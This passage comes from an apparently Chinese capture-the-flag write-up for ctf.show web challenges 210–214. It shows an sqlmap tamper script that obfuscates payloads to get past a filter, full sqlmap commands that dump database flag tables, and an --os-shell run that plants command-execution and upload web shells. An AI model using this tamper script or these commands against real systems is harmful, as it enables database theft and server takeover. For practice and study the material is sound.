class="token plain"> firstspace </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">xrange</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> firstspace</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">isspace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    firstspace </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    retVal </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token keyword" style="color:#00009f">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">elif</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;\&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                quote </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> quote</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">elif</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&quot;&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                doublequote </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> doublequote</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">elif</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                retVal </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;like&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">elif</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> doublequote </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> quote</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                retVal </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            retVal </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload_ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> retVal</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    retVal </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload_ret</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> retVal</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>其他不变，只不过老东西又变了，总之web210的payload如下</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://d89fa806-8595-4b7d-99fa-fbee60b83efb.challenge.ctf.show/api/index.php --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://d89fa806-8595-4b7d-99fa-fbee60b83efb.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --user-agent sqlmap --referer http://d89fa806-8595-4b7d-99fa-fbee60b83efb.challenge.ctf.show/sqlmap.php --tamper=web210.py --threads=3 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后发现这三题都能用差不多一个payload</p>
<p>web211只是在刚刚的基础上过滤了空格，然后老东西变成了-D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">web211</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://4bd80180-65e8-4d50-908f-04b91ab7e392.challenge.ctf.show/api/index.php --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4bd80180-65e8-4d50-908f-04b91ab7e392.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --user-agent sqlmap --referer http://4bd80180-65e8-4d50-908f-04b91ab7e392.challenge.ctf.show/sqlmap.php --tamper=web210.py --threads=3 -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>web212过滤*，之前说了，这个没啥用</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">web212</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://1ae3935c-31f0-4a16-8d22-a3aa81418707.challenge.ctf.show/api/index.php --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://1ae3935c-31f0-4a16-8d22-a3aa81418707.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --user-agent sqlmap --referer http://1ae3935c-31f0-4a16-8d22-a3aa81418707.challenge.ctf.show/sqlmap.php --tamper=web210.py --threads=3 -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa --dump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web213">web213<a href="#web213" class="hash-link" aria-label="Direct link to web213" title="Direct link to web213">​</a></h3>
<p>题目说练习使用--os-shell 一键getshell</p>
<p>原理是into outfile函数将一个可以用来上传的文件写到网站的根目录下。然后一个文件是命令执行，一个是上传文件</p>
<div class="language-？ codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-？ codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">在mysql中，由 secure_file_priv 参数来控制导入导出权限，该参数后面为null时，则表示不允许导入导出；如果是一个文件夹，则表示仅能在这个文件夹中导入导出；如果参数后面为空，也就是没有值时，则表示在任何文件夹都能导入导出</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>用web210.py试试哈</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">test</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u http://97a2ce63-a000-4020-838b-9eccc076d657.challenge.ctf.show/api/index.php --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://97a2ce63-a000-4020-838b-9eccc076d657.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --user-agent sqlmap --referer http://97a2ce63-a000-4020-838b-9eccc076d657.challenge.ctf.show/sqlmap.php --tamper=web210.py --threads=3 --os-shell</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>开始抉择了家人们</p>
<p><img decoding="async" loading="lazy" alt="image-20220110151303768" src="/assets/images/image-20220110151303768-f3324cd8b89e3c619fae6520294fa038.png" width="645" height="246" class="img_ev3q"></p>
<p>因为我们是php靶机，所以这里输入4 回车。后面那个默认y</p>
<p><img decoding="async" loading="lazy" alt="image-20220110151341593" src="/assets/images/image-20220110151341593-f6bb3d72962c2bb1439e86c07619aeba.png" width="960" height="253" class="img_ev3q"></p>
<p>目录就1</p>
<p><img decoding="async" loading="lazy" alt="image-20220110151415901" src="/assets/images/image-20220110151415901-dae0099f3953254e3640c27949fd098c.png" width="750" height="279" class="img_ev3q"></p>
<p>拿到shell</p>
<p>此时可以发现多了两个tmp文件</p>
<p><img decoding="async" loading="lazy" alt="image-20220110151453653" src="/assets/images/image-20220110151453653-6ea5f84cb30e68ca30e93b8cb7a94990.png" width="938" height="230" class="img_ev3q"></p>
<p>可以发现其中一个是命令执行的</p>
<p><img decoding="async" loading="lazy" alt="image-20220110151514368" src="/assets/images/image-20220110151514368-4962b942da999923644d1edfcc8f08eb.png" width="1088" height="254" class="img_ev3q"></p>
<p>而另一个是进行文件上传的</p>
<p>总之上去之后cat /ctfshow_flag即可</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web214">web214<a href="#web214" class="hash-link" aria-label="Direct link to web214" title="Direct link to web214">​</a></h3>
<p>sqlmap圆满结束，学到挺多的，现在开始是时间盲注，和编写脚本离不开了</p>
<p><img decoding="async" loading="lazy" alt="image-20220110151720174" src="data:image/png;base64,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